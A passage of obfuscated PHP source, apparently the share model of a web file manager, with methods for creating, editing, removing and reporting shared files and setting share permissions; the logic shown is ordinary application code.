"\146\165\x6e\x63\164\151\157\x6e"), array("\x6f\160\164\x69\x6f\x6e\163", '', "\x69\156\163\145\x72\x74\54\x75\x70\x64\x61\x74\145\x2c\x73\x65\154\145\x63\164", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¦Ôê¬Å‰) { $‚×ğı¸× =& $_SERVER[ÕŸ²ó÷å]; $„ƒØÂñš = isset($¦Ôê¬Å‰[0]) ? $¦Ôê¬Å‰[0] : !1; return array($‚×ğı¸×[2115] => array(USER_ID, $‚×ğı¸×[2116]), $‚×ğı¸×[2056] => array($„ƒØÂñš, $‚×ğı¸×[2117])); } protected function listSimple() { $‰¾Òñóµ = array($_SERVER[ÕŸ²ó÷å][1773] => USER_ID); $¿²½àçÜ = $this->field($this->fieldList)->where($‰¾Òñóµ)->select(); return $¿²½àçÜ ? $¿²½àçÜ : array(); } protected function getInfo($õÔäïÆ„, $ùç‰µ¾÷ = false) { $–Å…Æ × =& $_SERVER[ÕŸ²ó÷å]; if ($ùç‰µ¾÷) { return $this->_getShareInfo(array($–Å…Æ ×[674] => $õÔäïÆ„)); } $ÕŸİÉ¯… = $this->cacheFunctionGet($–Å…Æ ×[2058], $õÔäïÆ„); return $ÕŸİÉ¯…; } public function getInfoByHash($Â¸·ŒÈ) { return $this->_getShareInfo(array($_SERVER[ÕŸ²ó÷å][2118] => $Â¸·ŒÈ)); } public function getInfoByPath($ˆ§•ˆ•Â) { $úá×Âš¦ =& $_SERVER[ÕŸ²ó÷å]; $Éú©Î = array($úá×Âš¦[1773] => USER_ID, $úá×Âš¦[203] => $ˆ§•ˆ•Â); return $this->_getShareInfo($Éú©Î); } public function getInfoBySourcePath($Ç¶ËÒÙÕ) { $ö½Óñ¡— =& $_SERVER[ÕŸ²ó÷å]; $è»¯³—¿ = array($ö½Óñ¡—[1773] => USER_ID, $ö½Óñ¡—[1260] => $Ç¶ËÒÙÕ); return $this->_getShareInfo($è»¯³—¿); } private function _getShareInfo($Û™Ìˆ«‡) { $øè³ü’Í =& $_SERVER[ÕŸ²ó÷å]; $„ ÓÚöê = $this->where($Û™Ìˆ«‡)->find(); if (!$„ ÓÚöê) { return !1; } $Û™Ìˆ«‡ = array($øè³ü’Í[674] => $„ ÓÚöê[$øè³ü’Í[674]]); $õÚ˜ªçÎ = $øè³ü’Í[2119]; $–ŒÄšñÚ = Model($øè³ü’Í[675])->order($øè³ü’Í[484])->field($õÚ˜ªçÎ)->where($Û™Ìˆ«‡)->select(); if ($„ ÓÚöê[$øè³ü’Í[203]] == $øè³ü’Í[238]) { $„ ÓÚöê[$øè³ü’Í[100]] = IO::info($„ ÓÚöê[$øè³ü’Í[1260]]); } else { $„ ÓÚöê[$øè³ü’Í[100]] = Model($øè³ü’Í[1421])->pathInfo($„ ÓÚöê[$øè³ü’Í[203]]); } $„ ÓÚöê[$øè³ü’Í[2120]] = $–ŒÄšñÚ; return $„ ÓÚöê; } protected function getInfoAuth($„Ëû§ˆ¾) { $¢®ßÓŠ =& $_SERVER[ÕŸ²ó÷å]; $ì½È­“ˆ = $this->getInfo($„Ëû§ˆ¾); if ($ì½È­“ˆ[$¢®ßÓŠ[1773]] == USER_ID) { $ì½È­“ˆ[$¢®ßÓŠ[496]] = $ì½È­“ˆ[$¢®ßÓŠ[100]][$¢®ßÓŠ[496]]; } else { $ì½È­“ˆ[$¢®ßÓŠ[496]] = Model($¢®ßÓŠ[576])->authMake($ì½È­“ˆ[$¢®ßÓŠ[2120]]); } return $ì½È­“ˆ; } protected function listData($›¡„–á– = null, $¹²äö™Ï = 300) { $êíÃ·Ñ =& $_SERVER[ÕŸ²ó÷å]; $Á…¯á› = array(array($êíÃ·Ñ[571] => array($êíÃ·Ñ[1093], 0), $êíÃ·Ñ[672] => array($êíÃ·Ñ[1093], 0), $êíÃ·Ñ[2121] => $êíÃ·Ñ[2074])); if ($›¡„–á– == $êíÃ·Ñ[2122]) { $Á…¯á› = array($êíÃ·Ñ[571] => 1); } else { if ($›¡„–á– == $êíÃ·Ñ[1245]) { $Á…¯á› = array($êíÃ·Ñ[672] => 1); } } $Á…¯á›[$êíÃ·Ñ[1773]] = USER_ID; $şÇÇ°ÙÊ = $this->where($Á…¯á›)->selectPage($¹²äö™Ï); return $şÇÇ°ÙÊ; } protected function listToMe($Ó³ø™Ø = 300) { $şÛ¬§ë• =& $_SERVER[ÕŸ²ó÷å]; $ó´Ü±Í« = Model($şÛ¬§ë•[2123])->userGroupParents(USER_ID); $áµºæĞú = array($şÛ¬§ë•[657] => SourceModel::TYPE_USER, $şÛ¬§ë•[578] => USER_ID); if ($ó´Ü±Í«) { $áµºæĞú = array(array($şÛ¬§ë•[657] => SourceModel::TYPE_USER, $şÛ¬§ë•[578] => USER_ID), array($şÛ¬§ë•[657] => SourceModel::TYPE_GROUP, $şÛ¬§ë•[578] => array($şÛ¬§ë•[7], $ó´Ü±Í«)), $şÛ¬§ë•[2121] => $şÛ¬§ë•[2074]); } $ö¾ğıìƒ = Model($şÛ¬§ë•[675])->where($áµºæĞú)->selectPage($Ó³ø™Ø); $÷İ¡×ªÓ = array_to_keyvalue_group($ö¾ğıìƒ[$şÛ¬§ë•[454]], $şÛ¬§ë•[674]); if (!$÷İ¡×ªÓ) { return $ö¾ğıìƒ; } $Èò‚Ä”ù = $şÛ¬§ë•[2124]; $áµºæĞú = array($şÛ¬§ë•[674] => array($şÛ¬§ë•[501], array_keys($÷İ¡×ªÓ)), $şÛ¬§ë•[1773] => array($şÛ¬§ë•[1095], $şÛ¬§ë•[238])); $úŒ“ˆàÆ = $this->field($Èò‚Ä”ù)->where($áµºæĞú)->select(); foreach ($úŒ“ˆàÆ as $Ü˜éŸÇ´ => &$°ò¹Ú¶Î) { $°ò¹Ú¶Î[$şÛ¬§ë•[2120]] = $÷İ¡×ªÓ[$°ò¹Ú¶Î[$şÛ¬§ë•[674]]]; } unset($°ò¹Ú¶Î); $â‘÷ÒŠ¸ = array($şÛ¬§ë•[2125] => $úŒ“ˆàÆ, $şÛ¬§ë•[2126] => $ö¾ğıìƒ[$şÛ¬§ë•[451]]); return $â‘÷ÒŠ¸; } protected function shareAdd($ıšÃÄú, $Âƒ²Ç°) { $óã°Ëùö =& $_SERVER[ÕŸ²ó÷å]; $çÃÁ€ûÌ = $this->_addShareData($ıšÃÄú, $Âƒ²Ç°); if (!empty($Âƒ²Ç°[$óã°Ëùö[2127]])) { $this->_shareAuthSet($çÃÁ€ûÌ, $Âƒ²Ç°[$óã°Ëùö[2127]]); } $this->shareEventAdd($ıšÃÄú, $Âƒ²Ç°, $óã°Ëùö[2128]); return $çÃÁ€ûÌ; } protected function shareAddSystem($êé†Ó¾Ù, $ş± ­½‚) { $ı¨ÓÍÁ =& $_SERVER[ÕŸ²ó÷å]; $ù“³üØÊ = $this->_addShareData($êé†Ó¾Ù, $ş± ­½‚, $ı¨ÓÍÁ[201]); $this->_shareAuthSet($ù“³üØÊ, $ş± ­½‚[$ı¨ÓÍÁ[2127]]); return $ù“³üØÊ; } private function shareEventAdd($°şÍó³ª, $™ôù®Í¡, $Ğ©±¿¢¶ = "\141\144\x64") { $–¦¥ú¸ò =& $_SERVER[ÕŸ²ó÷å]; if (!$°şÍó³ª || $°şÍó³ª == $–¦¥ú¸ò[238]) { return; } if ($Ğ©±¿¢¶ == $–¦¥ú¸ò[2128]) { if ($™ôù®Í¡[$–¦¥ú¸ò[571]] == $–¦¥ú¸ò[101]) { Model($–¦¥ú¸ò[642])->eventShare($°şÍó³ª, $–¦¥ú¸ò[2129]); } if ($™ôù®Í¡[$–¦¥ú¸ò[672]] == $–¦¥ú¸ò[101]) { Model($–¦¥ú¸ò[642])->eventShare($°şÍó³ª, $–¦¥ú¸ò[2130]); } return; } $¸œğï¶ = $this->getInfoByPath($°şÍó³ª); $ÊÖÄÎ“ç = $–¦¥ú¸ò[2131]; if ($¸œğï¶[$–¦¥ú¸ò[571]] == $–¦¥ú¸ò[238] && $™ôù®Í¡[$–¦¥ú¸ò[571]] == $–¦¥ú¸ò[101]) { $ÊÖÄÎ“ç = $–¦¥ú¸ò[2129]; } if ($¸œğï¶[$–¦¥ú¸ò[571]] == $–¦¥ú¸ò[101] && $™ôù®Í¡[$–¦¥ú¸ò[571]] == $–¦¥ú¸ò[238]) { $ÊÖÄÎ“ç = $–¦¥ú¸ò[2132]; } if ($¸œğï¶[$–¦¥ú¸ò[672]] == $–¦¥ú¸ò[238] && $™ôù®Í¡[$–¦¥ú¸ò[672]] == $–¦¥ú¸ò[101]) { $ÊÖÄÎ“ç = $–¦¥ú¸ò[2130]; } if ($¸œğï¶[$–¦¥ú¸ò[672]] == $–¦¥ú¸ò[101] && $™ôù®Í¡[$–¦¥ú¸ò[672]] == $–¦¥ú¸ò[238]) { $ÊÖÄÎ“ç = $–¦¥ú¸ò[2133]; } Model($–¦¥ú¸ò[642])->eventShare($°şÍó³ª, $ÊÖÄÎ“ç); return; } private function _addShareData($ù¬È³¾¬, $Ûè¢æ¥„ = array(), $¾ŸûÛ¨ï = false) { $ºåŞï´í =& $_SERVER[ÕŸ²ó÷å]; $ß¬ö‘Ãª = $¾ŸûÛ¨ï == $ºåŞï´í[201] ? 0 : USER_ID; $¶ÃßÅ¢Ç = array($ºåŞï´í[500] => $ù¬È³¾¬, $ºåŞï´í[1764] => $ß¬ö‘Ãª); if ($ù¬È³¾¬ == 0) { $¶ÃßÅ¢Ç = array($ºåŞï´í[2134] => $Ûè¢æ¥„[$ºåŞï´í[1260]], $ºåŞï´í[1764] => $ß¬ö‘Ãª); } if ($ÍÀöº¿İ = $this->where($¶ÃßÅ¢Ç)->find()) { return $ÍÀöº¿İ[$ºåŞï´í[674]]; } if ($ù¬È³¾¬ == 0) { $ÂØÒµ¸… = array($ºåŞï´í[32] => get_path_this($Ûè¢æ¥„[$ºåŞï´í[97]])); } else { $ÂØÒµ¸… = Model($ºåŞï´í[908])->sourceInfo($ù¬È³¾¬); if (!$ÂØÒµ¸…) { return !1; } } if (!$Ûè¢æ¥„[$ºåŞï´í[1662]]) { $Ûè¢æ¥„[$ºåŞï´í[1662]] = $ÂØÒµ¸…[$ºåŞï´í[32]]; } $ïã¡¶Çú = array($ºåŞï´í[1764] => $ß¬ö‘Ãª, $ºåŞï´í[500] => $ù¬È³¾¬, $ºåŞï´í[1662] => $ºåŞï´í[12], $ºåŞï´í[571] => 0, $ºåŞï´í[672] => 0, $ºåŞï´í[1260] => $ºåŞï´í[12], $ºåŞï´í[392] => $ºåŞï´í[12], $ºåŞï´í[970] => $ºåŞï´í[12], $ºåŞï´í[2135] => 0, $ºåŞï´í[2136] => 0, $ºåŞï´í[845] => 0, $ºåŞï´í[2137] => $ºåŞï´í[12], $ºåŞï´í[2118] => $ºåŞï´í[12]); $ãøˆÀÇÓ = explode($ºåŞï´í[50], $ºåŞï´í[2138]); foreach ($ãøˆÀÇÓ as $õœê«¯È) { if (!isset($Ûè¢æ¥„[$õœê«¯È])) { continue; } $ïã¡¶Çú[$õœê«¯È] = $Ûè¢æ¥„[$õœê«¯È]; } $•¿ÕËÄ = $this->add($ïã¡¶Çú); $ÎÔ• íˆ = array($ºåŞï´í[2118] => short_id($•¿ÕËÄ)); $this->where(array($ºåŞï´í[2139] => $•¿ÕËÄ))->save($ÎÔ• íˆ); return $•¿ÕËÄ; } private function _shareAuthSet($Ï›’ËÍñ, $”ƒÛÀê¤) { $¦Å¡ë =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($”ƒÛÀê¤)) { return !1; } $×à¹œ×œ = Model($¦Å¡ë[2084]); $×à¹œ×œ->where(array($¦Å¡ë[674] => $Ï›’ËÍñ))->delete(); $€§®›Ä = array(); foreach ($”ƒÛÀê¤ as $ÙäÆõ„¹) { $Ö·ØÂ¾á = SourceModel::TYPE_USER; if ($ÙäÆõ„¹[$¦Å¡ë[200]] == SourceModel::TYPE_GROUP) { $Ö·ØÂ¾á = SourceModel::TYPE_GROUP; } $×™°‚ú§ = array($¦Å¡ë[674] => $Ï›’ËÍñ, $¦Å¡ë[200] => $Ö·ØÂ¾á, $¦Å¡ë[578] => intval($ÙäÆõ„¹[$¦Å¡ë[578]]), $¦Å¡ë[2080] => 0, $¦Å¡ë[2140] => -1); if ($ÙäÆõ„¹[$¦Å¡ë[2080]]) { $×™°‚ú§[$¦Å¡ë[2080]] = $ÙäÆõ„¹[$¦Å¡ë[2080]]; } else { if ($ÙäÆõ„¹[$¦Å¡ë[2140]]) { $×™°‚ú§[$¦Å¡ë[2140]] = $ÙäÆõ„¹[$¦Å¡ë[2140]]; } } $€§®›Ä[] = $×™°‚ú§; } return $×à¹œ×œ->addAll($€§®›Ä, array(), !0); } public function numViewAdd($¯æªÕØİ) { $Ğ³Ş§º˜ =& $_SERVER[ÕŸ²ó÷å]; $Ó¯‘£Ò’ = array($Ğ³Ş§º˜[2139] => $¯æªÕØİ); $this->where($Ó¯‘£Ò’)->setAdd($Ğ³Ş§º˜[2135]); } public function numDownloadAdd($è¤Ã»™ı) { $¢ˆ•º”Å =& $_SERVER[ÕŸ²ó÷å]; $ºıó¦ŒĞ = array($¢ˆ•º”Å[2139] => $è¤Ã»™ı); $this->where($ºıó¦ŒĞ)->setAdd($¢ˆ•º”Å[2136]); } protected function shareEdit($È  êşÕ, $®¸öÍ) { $şèÃß²ˆ =& $_SERVER[ÕŸ²ó÷å]; $µ«ù´ğ = $this->getInfo($È  êşÕ); if (!$µ«ù´ğ) { return !1; } $this->_checkLinkShare($®¸öÍ, $µ«ù´ğ); $òÈş¨Ğ = array(); $Ò¦…¯ƒâ = explode($şèÃß²ˆ[50], $şèÃß²ˆ[2141]); foreach ($Ò¦…¯ƒâ as $ì×ş¯Ì¶) { if (!array_key_exists($ì×ş¯Ì¶, $®¸öÍ)) { continue; } $òÈş¨Ğ[$ì×ş¯Ì¶] = $®¸öÍ[$ì×ş¯Ì¶]; } $this->shareEventAdd($µ«ù´ğ[$şèÃß²ˆ[203]], $®¸öÍ, $şèÃß²ˆ[1941]); $this->where(array($şèÃß²ˆ[2139] => $È  êşÕ))->save($òÈş¨Ğ); if (isset($®¸öÍ[$şèÃß²ˆ[2127]])) { $this->_shareAuthSet($È  êşÕ, $®¸öÍ[$şèÃß²ˆ[2127]]); } return !0; } private function _checkLinkShare($µâÍç‹Ä, $µ¬ùßÎü) { $âÈ£Ê¬Ô =& $_SERVER[ÕŸ²ó÷å]; if ($µâÍç‹Ä[$âÈ£Ê¬Ô[571]] != $âÈ£Ê¬Ô[101]) { return; } $Å ˜ĞíŞ = $µ¬ùßÎü[$âÈ£Ê¬Ô[100]][$âÈ£Ê¬Ô[203]]; if ($µ¬ùßÎü[$âÈ£Ê¬Ô[100]][$âÈ£Ê¬Ô[33]] != $âÈ£Ê¬Ô[240]) { $Ì¸À›â = $this->_folderReport($Å ˜ĞíŞ); if (!$Ì¸À›â) { return; } show_json(LNG($âÈ£Ê¬Ô[2142]) . $âÈ£Ê¬Ô[2143] . $Ì¸À›â, !1); } $Üèµ°•Ø = Model($âÈ£Ê¬Ô[908])->fileInfoGet($µ¬ùßÎü[$âÈ£Ê¬Ô[100]][$âÈ£Ê¬Ô[203]]); if (!$Üèµ°•Ø) { return; } $Ëà±Ü = $this->shareFileMeta($Üèµ°•Ø[$âÈ£Ê¬Ô[550]]); if (isset($Ëà±Ü[$âÈ£Ê¬Ô[459]]) && $Ëà±Ü[$âÈ£Ê¬Ô[459]] == $âÈ£Ê¬Ô[101]) { show_json(LNG($âÈ£Ê¬Ô[2144]), !1); } } private function _folderReport($¡ú·±ãŠ) { $±ùÔñöÂ =& $_SERVER[ÕŸ²ó÷å]; $©ÒŞŸÉ = array($±ùÔñöÂ[550] => array($±ùÔñöÂ[1093], 0), $±ùÔñöÂ[834] => 3); $“» òè = Model($±ùÔñöÂ[2145])->where($©ÒŞŸÉ)->field($±ùÔñöÂ[550])->select(); if (!$“» òè) { return !1; } $“» òè = array_to_keyvalue($“» òè, $±ùÔñöÂ[12], $±ùÔñöÂ[550]); $ø‘ô¹ = $±ùÔñöÂ[50] . $¡ú·±ãŠ . $±ùÔñöÂ[50]; $©ÒŞŸÉ = array($±ùÔñöÂ[550] => array($±ùÔñöÂ[7], $“» òè), $±ùÔñöÂ[593] => array($±ùÔñöÂ[468], "\45{$ø‘ô¹}\45"), $±ùÔñöÂ[514] => 0); $®¼°ò»ø = Model($±ùÔñöÂ[908])->where($©ÒŞŸÉ)->field($±ùÔñöÂ[2146])->find(); if (!$®¼°ò»ø) { return !1; } $ˆ¯¯“³¨ = substr($®¼°ò»ø[$±ùÔñöÂ[593]], strpos($®¼°ò»ø[$±ùÔñöÂ[593]], $ø‘ô¹)); $©ÒŞŸÉ = array($±ùÔñöÂ[203] => array($±ùÔñöÂ[7], trim($ˆ¯¯“³¨, $±ùÔñöÂ[50]))); $î¥°ÂÑ = Model($±ùÔñöÂ[908])->where($©ÒŞŸÉ)->field($±ùÔñöÂ[32])->select(); $æÔÑçŠ = array_to_keyvalue($î¥°ÂÑ, $±ùÔñöÂ[12], $±ùÔñöÂ[32]); $æÔÑçŠ[] = $®¼°ò»ø[$±ùÔñöÂ[32]]; return implode($±ùÔñöÂ[8], $æÔÑçŠ); } protected function remove($õ®¿ùæÂ) { $æÀ”ò¥– =& $_SERVER[ÕŸ²ó÷å]; $‰ş«éêë = is_array($õ®¿ùæÂ) ? $õ®¿ùæÂ : array($õ®¿ùæÂ); for ($¹£ßô’— = 0; $¹£ßô’— < count($‰ş«éêë); $¹£ßô’—++) { $ú‡àä¸à = $this->getInfo($‰ş«éêë[$¹£ßô’—]); if ($ú‡àä¸à[$æÀ”ò¥–[672]] == $æÀ”ò¥–[101]) { Model($æÀ”ò¥–[642])->eventShare($ú‡àä¸à[$æÀ”ò¥–[203]], $æÀ”ò¥–[2133]); } if ($ú‡àä¸à[$æÀ”ò¥–[571]] == $æÀ”ò¥–[101]) { Model($æÀ”ò¥–[642])->eventShare($ú‡àä¸à[$æÀ”ò¥–[203]], $æÀ”ò¥–[2132]); } } if (is_array($õ®¿ùæÂ)) { $õ®¿ùæÂ = array($æÀ”ò¥–[7], $õ®¿ùæÂ); } $óøÛ èÀ = array($æÀ”ò¥–[674] => $õ®¿ùæÂ); $·è¨·•¼ = $this->where($óøÛ èÀ)->delete(); if ($·è¨·•¼) { Model($æÀ”ò¥–[675])->where(array($æÀ”ò¥–[674] => $õ®¿ùæÂ))->delete(); } return $·è¨·•¼; } protected function removeBySource($ìØùƒù¶) { $²£ëÕâŒ =& $_SERVER[ÕŸ²ó÷å]; $»½–¨¥¥ = array($²£ëÕâŒ[500] => array($²£ëÕâŒ[501], $ìØùƒù¶)); $‰È»Î® = $this->field($²£ëÕâŒ[674])->where($»½–¨¥¥)->select(); $‰È»Î® = array_to_keyvalue($‰È»Î®, $²£ëÕâŒ[12], $²£ëÕâŒ[674]); if (!$‰È»Î®) { return; } $»½–¨¥¥ = array($²£ëÕâŒ[2139] => array($²£ëÕâŒ[501], $‰È»Î®)); $this->where($»½–¨¥¥)->delete(); Model($²£ëÕâŒ[675])->where($»½–¨¥¥)->delete(); } public function listAll($°ç‘ë…) { $µ½°ÏÁÖ =& $_SERVER[ÕŸ²ó÷å]; $‹ÒÑŒ = array(); if ($°ç‘ë…[$µ½°ÏÁÖ[1773]]) { $‹ÒÑŒ[$µ½°ÏÁÖ[1773]] = $°ç‘ë…[$µ½°ÏÁÖ[1773]]; } if ($°ç‘ë…[$µ½°ÏÁÖ[844]]) { $‚Åß–¯Ä = $°ç‘ë…[$µ½°ÏÁÖ[845]] ? $°ç‘ë…[$µ½°ÏÁÖ[845]] : strtotime(date($µ½°ÏÁÖ[2147])); $‹ÒÑŒ[$µ½°ÏÁÖ[241]] = array($µ½°ÏÁÖ[418], array($°ç‘ë…[$µ½°ÏÁÖ[844]], $‚Åß–¯Ä)); } if ($°ç‘ë…[$µ½°ÏÁÖ[33]]) { $‹ÒÑŒ[$°ç‘ë…[$µ½°ÏÁÖ[33]]] = 1; } else { $‹ÒÑŒ[] = array($µ½°ÏÁÖ[571] => array($µ½°ÏÁÖ[1093], 0), $µ½°ÏÁÖ[672] => array($µ½°ÏÁÖ[1093], 0), $µ½°ÏÁÖ[2121] => $µ½°ÏÁÖ[2074]); } if ($°ç‘ë…[$µ½°ÏÁÖ[2070]]) { $‹ÒÑŒ[] = array($µ½°ÏÁÖ[2118] => $°ç‘ë…[$µ½°ÏÁÖ[2070]], $µ½°ÏÁÖ[1662] => array($µ½°ÏÁÖ[468], "\45{$°ç‘ë…[$µ½°ÏÁÖ[2070]]}\x25"), $µ½°ÏÁÖ[2121] => $µ½°ÏÁÖ[2074]); } $òè¥¯Ÿ = $this->_makeOrder()->where($‹ÒÑŒ)->selectPage(20); if (empty($òè¥¯Ÿ[$µ½°ÏÁÖ[454]])) { return array(); } $this->_listDataApply($òè¥¯Ÿ[$µ½°ÏÁÖ[454]]); return $òè¥¯Ÿ; } public function listDataApply($”ì¿€µé) { $this->_listDataApply($”ì¿€µé); return $”ì¿€µé; } private function _listDataApply(&$Èä¤·) { $µ¦êŒ¤» =& $_SERVER[ÕŸ²ó÷å]; $ùûĞµ·½ = array_to_keyvalue($Èä¤·, $µ¦êŒ¤»[12], $µ¦êŒ¤»[1773]); $Òø—é = Model($µ¦êŒ¤»[607])->userListInfo(array_unique($ùûĞµ·½)); $¦ŒØË = array_to_keyvalue($Èä¤·, $µ¦êŒ¤»[12], $µ¦êŒ¤»[203]); $¯â»ª»Ö = Model($µ¦êŒ¤»[908])->sourceListInfo($¦ŒØË, !0); foreach ($Èä¤· as $Âü½û => &$œØ­Š§÷) { $ÂŠ˜Ï²æ = $œØ­Š§÷[$µ¦êŒ¤»[1773]]; $œØ­Š§÷[$µ¦êŒ¤»[2148]] = $Òø—é[$ÂŠ˜Ï²æ] ? $Òø—é[$ÂŠ˜Ï²æ] : !1; $¿ÙÏ– = $œØ­Š§÷[$µ¦êŒ¤»[203]]; $œØ­Š§÷[$µ¦êŒ¤»[100]] = $¯â»ª»Ö[$¿ÙÏ–] ? $¯â»ª»Ö[$¿ÙÏ–] : !1; if ($œØ­Š§÷[$µ¦êŒ¤»[100]][$µ¦êŒ¤»[514]] == $µ¦êŒ¤»[101]) { unset($Èä¤·[$Âü½û]); } if ($œØ­Š§÷[$µ¦êŒ¤»[100]] != $µ¦êŒ¤»[238] && !$œØ­Š§÷[$µ¦êŒ¤»[100]]) { unset($Èä¤·[$Âü½û]); } } unset($œØ­Š§÷); $Èä¤· = array_values($Èä¤·); } private function _makeOrder($á²á¹âó = '') { $¨¢İá– =& $_SERVER[ÕŸ²ó÷å]; $§ş¯ôù = array($¨¢İá–[241], $¨¢İá–[845], $¨¢İá–[2135], $¨¢İá–[2136]); $›…òççÔ = array($¨¢İá–[532] => $¨¢İá–[533], $¨¢İá–[534] => $¨¢İá–[535]); $Õ½ö…«Ğ = Input::get($¨¢İá–[539], $¨¢İá–[7], $¨¢İá–[506], $§ş¯ôù); $Ô€î©ÉÎ = Input::get($¨¢İá–[540], $¨¢İá–[7], $¨¢İá–[2149], array($¨¢İá–[2067], $¨¢İá–[534])); $Ô€î©ÉÎ = $›…òççÔ[$Ô€î©ÉÎ]; $á²á¹âó = $á²á¹âó . "{$Õ½ö…«Ğ}\x20{$Ô€î©ÉÎ}"; return $this->order($á²á¹âó); } public function reportAdd($¥è”˜‡´) { $£†»Å«­ =& $_SERVER[ÕŸ²ó÷å]; $ï¿–¶„ = array($£†»Å«­[674] => $¥è”˜‡´[$£†»Å«­[674]], $£†»Å«­[1773] => USER_ID); if (Model($£†»Å«­[2145])->where($ï¿–¶„)->find()) { return !1; } $ù¼œÄş· = array($£†»Å«­[674] => $¥è”˜‡´[$£†»Å«­[674]], $£†»Å«­[1662] => $¥è”˜‡´[$£†»Å«­[1662]], $£†»Å«­[203] => $¥è”˜‡´[$£†»Å«­[203]], $£†»Å«­[550] => $¥è”˜‡´[$£†»Å«­[550]], $£†»Å«­[1773] => USER_ID, $£†»Å«­[33] => $¥è”˜‡´[$£†»Å«­[33]], $£†»Å«­[535] => $¥è”˜‡´[$£†»Å«­[535]]); return Model($£†»Å«­[2145])->add($ù¼œÄş·); } public function reportList($ï´¬³¼) { $ÒØŞöŸ¾ =& $_SERVER[ÕŸ²ó÷å]; $ã€ÖÃŸë = array(); if ($ï´¬³¼[$ÒØŞöŸ¾[844]]) { $ó‚ñ¶˜˜ = $ï´¬³¼[$ÒØŞöŸ¾[845]] ? $ï´¬³¼[$ÒØŞöŸ¾[845]] : strtotime(date($ÒØŞöŸ¾[2147])); $ã€ÖÃŸë[$ÒØŞöŸ¾[241]] = array($ÒØŞöŸ¾[418], array($ï´¬³¼[$ÒØŞöŸ¾[844]], $ó‚ñ¶˜˜)); } if (isset($ï´¬³¼[$ÒØŞöŸ¾[33]]) && in_array($ï´¬³¼[$ÒØŞöŸ¾[33]], array($ÒØŞöŸ¾[101], $ÒØŞöŸ¾[519], $ÒØŞöŸ¾[2150], $ÒØŞöŸ¾[2151], $ÒØŞöŸ¾[2152]))) { $ã€ÖÃŸë[$ÒØŞöŸ¾[33]] = $ï´¬³¼[$ÒØŞöŸ¾[33]]; } if (isset($ï´¬³¼[$ÒØŞöŸ¾[834]]) && in_array($ï´¬³¼[$ÒØŞöŸ¾[834]], array($ÒØŞöŸ¾[238], $ÒØŞöŸ¾[101], $ÒØŞöŸ¾[519], $ÒØŞöŸ¾[2150]))) { $ã€ÖÃŸë[$ÒØŞöŸ¾[834]] = $ï´¬³¼[$ÒØŞöŸ¾[834]]; } $††ÌÑÍÑ = Input::get($ÒØŞöŸ¾[540], $ÒØŞöŸ¾[7], $ÒØŞöŸ¾[2149], array($ÒØŞöŸ¾[2067], $ÒØŞöŸ¾[534])); $ş‚İÃ”Õ = array($ÒØŞöŸ¾[532] => $ÒØŞöŸ¾[533], $ÒØŞöŸ¾[534] => $ÒØŞöŸ¾[535]); $ÂÛ»å”– = $ÒØŞöŸ¾[2153] . $ş‚İÃ”Õ[$††ÌÑÍÑ]; $µœ„¾Ş’ = Model($ÒØŞöŸ¾[2145])->where($ã€ÖÃŸë)->order($ÂÛ»å”–)->selectPage(20); if (empty($µœ„¾Ş’[$ÒØŞöŸ¾[454]])) { return array(); } $ÔÅ€˜ß© = array_to_keyvalue_group($µœ„¾Ş’[$ÒØŞöŸ¾[454]], $ÒØŞöŸ¾[834], $ÒØŞöŸ¾[674]); if (!empty($ÔÅ€˜ß©[0])) { $ï´¬³¼ = $ÔÅ€˜ß©[0]; $ã€ÖÃŸë = array($ÒØŞöŸ¾[674] => array($ÒØŞöŸ¾[7], $ï´¬³¼)); $›—×’¼º = $this->where($ã€ÖÃŸë)->field($ÒØŞöŸ¾[674])->select(); $›—×’¼º = array_to_keyvalue($›—×’¼º, $ÒØŞöŸ¾[12], $ÒØŞöŸ¾[674]); $ŠÓ«ÌŒë = array_diff($ï´¬³¼, $›—×’¼º); if (!empty($ŠÓ«ÌŒë)) { foreach ($µœ„¾Ş’[$ÒØŞöŸ¾[454]] as $áòğîóæ => $Õ“÷Æ²) { if (in_array($Õ“÷Æ²[$ÒØŞöŸ¾[674]], $ŠÓ«ÌŒë)) { unset($µœ„¾Ş’[$ÒØŞöŸ¾[454]][$áòğîóæ]); } } } } $this->_listDataApply($µœ„¾Ş’[$ÒØŞöŸ¾[454]]); return $µœ„¾Ş’; } public function reportStatus($á”·Á•‡) { $¾æÃ‰¬³ =& $_SERVER[ÕŸ²ó÷å]; $¯á«ï¾ = array($¾æÃ‰¬³[484] => $á”·Á•‡[$¾æÃ‰¬³[484]]); $„µ‚Ó¦Ê = Model($¾æÃ‰¬³[2145])->where($¯á«ï¾)->field($¾æÃ‰¬³[2154])->find(); if (!$„µ‚Ó¦Ê) { return !1; } $ Çï«Î¦ = array($¾æÃ‰¬³[834] => $á”·Á•‡[$¾æÃ‰¬³[834]]); if ($á”·Á•‡[$¾æÃ‰¬³[834]] == $¾æÃ‰¬³[2150] && $„µ‚Ó¦Ê[$¾æÃ‰¬³[834]] == $¾æÃ‰¬³[2150]) { $ Çï«Î¦[$¾æÃ‰¬³[834]] = 0; } $üÇœä² = Model($¾æÃ‰¬³[2145])->where($¯á«ï¾)->save($ Çï«Î¦); if ($á”·Á•‡[$¾æÃ‰¬³[834]] == $¾æÃ‰¬³[519]) { if ($„µ‚Ó¦Ê[$¾æÃ‰¬³[550]] != $¾æÃ‰¬³[238] && $this->shareFileMeta($„µ‚Ó¦Ê[$¾æÃ‰¬³[550]])) { $this->shareFileMeta($„µ‚Ó¦Ê[$¾æÃ‰¬³[550]], 0); } $this->remove($„µ‚Ó¦Ê[$¾æÃ‰¬³[674]]); return !0; } if ($üÇœä² && $á”·Á•‡[$¾æÃ‰¬³[834]] == $¾æÃ‰¬³[2150]) { $ æ½»¤£ = $ Çï«Î¦[$¾æÃ‰¬³[834]] == $¾æÃ‰¬³[2150] ? 1 : 0; $this->shareFileMeta($„µ‚Ó¦Ê[$¾æÃ‰¬³[550]], $ æ½»¤£); $this->removeByFile($„µ‚Ó¦Ê[$¾æÃ‰¬³[550]]); } return $üÇœä²; } private function removeByFile($¿›šº‡‚) { $‡ç¸Ôà¢ =& $_SERVER[ÕŸ²ó÷å]; $¯¾®‡ôŒ = Model($‡ç¸Ôà¢[908])->where(array($‡ç¸Ôà¢[550] => $¿›šº‡‚))->field($‡ç¸Ôà¢[203])->select(); $–·Ÿ¹õ = array_to_keyvalue($¯¾®‡ôŒ, $‡ç¸Ôà¢[12], $‡ç¸Ôà¢[203]); $·ı§Û§à = array($‡ç¸Ôà¢[203] => array($‡ç¸Ôà¢[7], $–·Ÿ¹õ), 